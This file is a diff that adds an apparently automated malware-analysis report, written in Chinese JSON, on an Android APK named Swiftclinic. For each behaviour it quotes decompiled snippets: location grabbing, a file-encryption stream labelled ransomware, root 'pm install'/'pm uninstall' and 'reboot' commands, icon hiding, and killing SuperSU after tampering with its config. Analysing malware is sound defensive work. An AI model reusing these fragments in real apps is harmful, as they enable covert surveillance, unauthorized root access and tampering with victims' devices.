@@ -1,0 +1,225 @@
+{
+  "APK信息": {
+    "文件名": "e00655d06a07f6eb8e1a4b1bd82eefe310cde10ca11af4688e32c11d7b193d95.apk",
+    "sha256": "e00655d06a07f6eb8e1a4b1bd82eefe310cde10ca11af4688e32c11d7b193d95",
+    "包名": "nms.swiftclinic",
+    "应用名": "Swiftclinic",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 559.8
+  },
+  "行为列表": [
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\a\\i;",
+          "method_signature": "a(Context context, Location location)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\nCriteria criteria = new Criteria();\ncriteria.setAccuracy(2);\nLocation lastKnownLocation = locationManager.getLastKnownLocation(locationManager.getBestProvider(criteria, true));\nreturn (location == null || a(location, lastKnownLocation)) ? lastKnownLocation : location;\n...\nJSONObject jSONObject2 = new JSONObject();\njSONObject2.put(\"type\", \"Point\");\nJSONArray jSONArray = new JSONArray();",
+          "malicious_code_snippet_context": "      public static Location a(Context context, Location location) {\n          int i = d.a;\n          new StringBuilder(\"lastKnownLocation=\").append(location);\n>>>         LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\n>>>         Criteria criteria = new Criteria();\n>>>         criteria.setAccuracy(2);\n>>>         Location lastKnownLocation = locationManager.getLastKnownLocation(locationManager.getBestProvider(criteria, true));\n>>>         return (location == null || a(location, lastKnownLocation)) ? lastKnownLocation : location;\n>>>     }\n>>> \n>>>     public static void a(JSONObject jSONObject, Location location) throws JSONException {\n>>>         if (jSONObject == null) {\n              return;\n          }\n          JSONObject jSONObject2 = new JSONObject();",
+          "behavior_description": "该代码位于伪装成系统进程的 com.android.watchdog 包中（典型间谍软件伪装手法）。方法 a(Context, Location) 通过 LocationManager.getBestProvider() 选择精度最高的定位提供者，调用 getLastKnownLocation() 静默获取设备最后已知地理位置，并与传入位置比较后返回更优的位置数据；随后另一重载方法将获取到的位置序列化为 GeoJSON 格式（type: Point + 坐标数组），这是典型的位置数据上报封装格式，为后续上传至远程服务器做准备。数据流向：LocationManager.getLastKnownLocation()（窃取设备地理位置）→ JSONObject/JSONArray 序列化为 GeoJSON（封装位置数据，疑似用于 C2 服务器上报），属于间谍软件的位置追踪/隐私窃取行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": []
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\a\\f;",
+          "method_signature": "if(str == null || str.isEmpty()",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "super(outputStream, a(i, str, str2, str3));\nprivate static Cipher a(int i, String str, String str2, String str3) {\n    SecretKeySpec secretKeySpec = new SecretKeySpec(af.a(str2), str.split(\"/\")[0]);\n    IvParameterSpec ivParameterSpec = new IvParameterSpec(af.a(str3));\n    Cipher cipher = Cipher.getInstance(str);\n    cipher.init(i, secretKeySpec, ivParameterSpec);\n    return cipher;\n}",
+          "malicious_code_snippet_context": "      }\n  \n      public f(OutputStream outputStream, int i, String str, String str2, String str3) {\n>>>         super(outputStream, a(i, str, str2, str3));\n>>>     }\n>>> \n>>>     private static Cipher a(int i, String str, String str2, String str3) throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, InvalidAlgorithmParameterException {\n>>>         if (str == null || str.isEmpty() || str2 == null || str2.isEmpty() || str3 == null || str3.isEmpty()) {\n>>>             throw new IllegalArgumentException(\"cryptoProvider: \" + str + \", key: \" + str2 + \", iv: \" + str3);\n>>>         }\n>>>         SecretKeySpec secretKeySpec = new SecretKeySpec(af.a(str2), str.split(\"/\")[0]);\n          IvParameterSpec ivParameterSpec = new IvParameterSpec(af.a(str3));\n          Cipher cipher = Cipher.getInstance(str);\n          cipher.init(i, secretKeySpec, ivParameterSpec);",
+          "behavior_description": "该代码是勒索软件的文件加密引擎。类继承自CipherOutputStream，构造函数将目标文件输出流与加密器绑定，使写入该流的所有数据（即用户文件内容）被实时加密。静态方法a()接收加密模式（加密/解密）、算法描述（如AES/CBC/PKCS5Padding）、密钥和IV，构造SecretKeySpec与IvParameterSpec并初始化Cipher。数据流向：密钥与IV参数（str2/str3，通常硬编码或由C2下发）→ Cipher.init() → CipherOutputStream包装的文件写入 → 用户文件被加密且无法正常打开，配合勒索提示实现敲诈。该样本位于com.android.watchdog包（已知勒索软件家族），且行为已被确认为ransomware.file_encryption。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        },
+        {
+          "子行为": "silent_uninstall",
+          "中文名": "静默卸载",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "android.intent.action.DELETE"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\core\\d;",
+          "method_signature": "if(com.android.watchdog.a.o.b()",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (com.android.watchdog.a.o.b() <= 0) {\n    Intent intent = new Intent(\"android.intent.action.VIEW\");\n    intent.setDataAndType(Uri.fromFile(new File(strA)), \"application/vnd.android.package-archive\");\n    context.startActivity(intent);\n} else {\n    boolean z3 = context.getPackageManager().getPackageArchiveInfo(strA, 0) != null;\n    com.android.watchdog.a.o.e(strA, \"755\");\n    iA = z3 ? com.android.watchdog.a.o.a(\"pm install -r \" + strA) : com.android.watchdog.a.o.a(\"pm install \" + strA);\n}\nif (iA != 0) {\n    file.delete();\n}",
+          "malicious_code_snippet_context": "              return;\n          }\n          Context context = this.a;\n>>>         if (com.android.watchdog.a.o.b() <= 0) {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(new File(strA)), \"application/vnd.android.package-archive\");\n>>>             intent.setFlags(268435456);\n>>>             context.startActivity(intent);\n>>>             iA = 0;\n>>>         } else {\n>>>             boolean z3 = context.getPackageManager().getPackageArchiveInfo(strA, 0) != null;\n>>>             com.android.watchdog.a.o.e(strA, \"755\");\n>>>             iA = z3 ? com.android.watchdog.a.o.a(\"pm install -r \" + strA) : com.android.watchdog.a.o.a(\"pm install \" + strA);\n>>>         }\n>>>         if (iA != 0) {\n              file.delete();\n              throw new Exception(\"Error installing \" + strA + \", cmdRes=\" + iA + \", installSystem=\" + z);\n          }",
+          "behavior_description": "该代码是木马下载器的静默安装模块：接收一个本地APK文件路径strA（通常为从远程C2服务器下载的恶意载荷），先通过getPackageArchiveInfo校验文件是否为有效APK安装包，并用chmod将其权限改为755；当检测到具备root/系统权限（o.b()>0）时，通过shell执行'pm install -r <路径>'命令，在完全无用户感知、无任何安装确认界面的情况下静默安装该APK（-r参数表示覆盖安装并保留数据）；仅在无root权限时才降级为ACTION_VIEW意图弹出系统安装界面。安装成功后立即删除源APK文件以销毁证据。数据流向：下载到本地的APK文件路径(strA) → Runtime.exec执行pm install命令实现静默安装并删除源文件。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\android\\watchdog\\core\\d;",
+          "method_signature": "if(packageInfoA == null)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "PackageInfo packageInfoA = com.android.watchdog.a.k.a(context, str);\nif (packageInfoA == null) {\n    iA = -2;\n} else if (com.android.watchdog.a.o.b() > 0) {\n    iA = com.android.watchdog.a.k.a(context, packageInfoA, strArr);\n} else {\n    Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", packageInfoA.packageName, null));\n    intent.setFlags(268435456);\n    context.startActivity(intent);\n    iA = 0;\n}",
+          "malicious_code_snippet_context": "              strArr = null;\n          }\n          Context context = this.a;\n>>>         PackageInfo packageInfoA = com.android.watchdog.a.k.a(context, str);\n>>>         if (packageInfoA == null) {\n>>>             iA = -2;\n>>>         } else if (com.android.watchdog.a.o.b() > 0) {\n>>>             iA = com.android.watchdog.a.k.a(context, packageInfoA, strArr);\n>>>         } else {\n>>>             Intent intent = new Intent(\"android.intent.action.DELETE\", Uri.fromParts(\"package\", packageInfoA.packageName, null));\n>>>             intent.setFlags(268435456);\n>>>             context.startActivity(intent);\n>>>             iA = 0;\n>>>         }\n          switch (iA) {\n              case -2:\n                  throw new Exception(\"Package \" + str + \" not found\");",
+          "behavior_description": "该代码是远程控制类恶意软件的卸载指令执行模块。它接收一个目标应用包名 str（通常来自远程C2服务器下发的指令），先通过 PackageManager 查询该包是否已安装（未安装则抛出 'Package not found' 异常）；若检测到设备具有 root 权限（o.b() > 0），则调用 k.a() 以 root 方式执行完全静默的卸载操作（如执行 pm uninstall 命令），用户全程无任何感知；若无 root 权限，则降级构造 android.intent.action.DELETE 系统卸载 Intent 并启动卸载确认界面，诱导用户点击确认完成卸载。数据流向：远程指令指定的目标包名 → root 静默卸载/系统卸载 Intent。此类行为常被用于卸载安全软件、杀毒应用或竞争恶意软件，以保护自身存活并破坏设备防护。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\core\\h;",
+          "method_signature": "if(zA3)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.i.getPackageManager().setComponentEnabledSetting(new ComponentName(this.i, (Class<?>) MainActivity.class), 2, 1);",
+          "malicious_code_snippet_context": "                  this.f = new e(this.i);\n                  this.g = new d(this.i);\n                  try {\n>>>                     this.i.getPackageManager().setComponentEnabledSetting(new ComponentName(this.i, (Class<?>) MainActivity.class), 2, 1);\n                  } catch (Exception e2) {\n                      int i14 = com.android.watchdog.a.d.b;\n                  }",
+          "behavior_description": "该代码位于伪装成系统看护进程的恶意包 com.android.watchdog 中，在应用完成初始化（创建 v/e/d 等后台组件实例）后，立即调用 PackageManager.setComponentEnabledSetting() 将自身的 MainActivity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED（参数 2），并附带 DONT_KILL_APP 标志（参数 1）。数据流向为：应用自身上下文获取 PackageManager → 构造指向 MainActivity 的 ComponentName → 调用 setComponentEnabledSetting 禁用入口组件。禁用主 Activity 后，应用图标会立即从桌面启动器中消失，但进程不被杀死且仍在后台运行，用户无法通过图标发现和卸载该应用。这是恶意软件典型的隐蔽驻留与对抗卸载技术，结合后续读取 SharedPreferences 中 installedApk 标志判断首次安装的逻辑，表明该行为在安装完成后即触发，为后台持续执行恶意活动（如短信欺诈）提供掩护。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.KILL_BACKGROUND_PROCESSES"
+        ],
+        "字符串": [
+          "killBackgroundProcesses",
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\core\\w;",
+          "method_signature": "if(iB != -1)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "int iB = com.android.watchdog.a.g.b(context, \"eu.chainfire.supersu\");\nif (iB != -1) {\n    ((ActivityManager) context.getSystemService(\"activity\")).killBackgroundProcesses(\"eu.chainfire.supersu\");\n    Process.killProcess(iB);\n    Process.sendSignal(iB, 3);\n    Process.sendSignal(iB, 9);\n    com.android.watchdog.a.o.a(\"kill -9 \" + iB);\n}",
+          "malicious_code_snippet_context": "              }\n              try {\n                  TransformerFactory.newInstance().newTransformer().transform(new DOMSource(documentA), new StreamResult(new File(file.getAbsolutePath())));\n>>>                 int iB = com.android.watchdog.a.g.b(context, \"eu.chainfire.supersu\");\n>>>                 if (iB != -1) {\n>>>                     ((ActivityManager) context.getSystemService(\"activity\")).killBackgroundProcesses(\"eu.chainfire.supersu\");\n>>>                     Process.killProcess(iB);\n>>>                     Process.sendSignal(iB, 3);\n>>>                     Process.sendSignal(iB, 9);\n>>>                     com.android.watchdog.a.o.a(\"kill -9 \" + iB);\n>>>                 } else {\n                      int i5 = com.android.watchdog.a.d.c;\n                      new StringBuilder().append(\"eu.chainfire.supersu\").append(\" seems to be not running, can't kill\");\n                  }",
+          "behavior_description": "该代码先篡改SuperSU的配置文件（将config_default_trustsystem节点值设为true，使SuperSU默认信任系统应用），随后通过包名查询root权限管理工具SuperSU（eu.chainfire.supersu）的进程PID（source），若进程正在运行（iB != -1），则使用四种手段强行杀死该进程：killBackgroundProcesses、Process.killProcess、发送SIGQUIT(3)与SIGKILL(9)信号、以及执行\"kill -9 <pid>\" shell命令（sink）。杀死SuperSU的目的是让该root管理工具以被篡改的配置重新加载，从而使恶意程序绕过root授权弹窗自动获得超级用户权限，属于提权辅助与安全工具终止的恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\android\\watchdog\\a\\k;",
+          "method_signature": "if(iE2 != 0)",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "o.e(str2, \"644\");\nreturn o.a(context, new String[]{\"pm uninstall \" + packageArchiveInfo.packageName, \"reboot\"}, false);",
+          "malicious_code_snippet_context": "              new StringBuilder(\"Error copying \").append(str).append(\" to \").append(str2);\n              return iA2;\n          }\n>>>         int iE2 = o.e(str2, \"644\");\n>>>         if (iE2 != 0) {\n              int i4 = d.b;\n              return iE2;\n          }",
+          "behavior_description": "该代码位于伪装成系统组件的 com.android.watchdog 包中。代码先将复制到目标路径的 APK 文件权限设置为 644，随后通过命令执行函数 o.a() 依次执行两条 shell 命令：'pm uninstall <包名>' 静默卸载指定应用，以及 'reboot' 强制重启设备。数据流向为：通过 PackageManager 获取的 packageArchiveInfo.packageName（source）被拼接进 'pm uninstall ' 命令字符串，最终传入命令执行器 o.a()（sink）以 root/shell 方式执行卸载并重启设备。这是典型的恶意软件自我提权安装模式：将自身 APK 复制到系统分区、设置权限、卸载用户安装版本后重启以完成系统级驻留，强制重启也会中断用户正常使用并可能用于规避安全软件检测。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
